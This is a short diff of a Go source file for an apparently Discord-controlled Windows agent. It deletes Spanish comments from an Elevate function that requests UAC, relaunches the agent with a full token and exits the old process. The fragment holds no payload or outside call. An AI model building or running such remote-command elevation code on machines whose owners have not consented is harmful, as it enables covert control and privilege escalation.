@@ -12,12 +12,6 @@ import (
 	"github.com/local/govoid/internal/win32"
 )
 
-// Elevate pide UAC y relanza el agente con token completo.
-//
-// El padre no se retira a ciegas: espera el aviso que deja el hijo elevado. Si
-// el UAC se cancela —o nadie está delante de la pantalla para aceptarlo— el
-// agente actual sigue vivo y lo dice, en vez de apagarse y dejar la máquina sin
-// canal de administración.
 func Elevate(s *discordgo.Session, i *discordgo.InteractionCreate) {
 	if err := Defer(s, i); err != nil {
 		return
@@ -52,8 +46,6 @@ func Elevate(s *discordgo.Session, i *discordgo.InteractionCreate) {
 			util.EmbedField{Name: "nota", Value: "el proceso anterior se retira", Inline: true},
 		))
 
-		// El hijo ya tomó el relevo: se suelta el mutex saliendo. Un segundo y
-		// medio es margen para que su gateway termine de identificar.
 		time.Sleep(1500 * time.Millisecond)
 		os.Exit(0)
 	}()
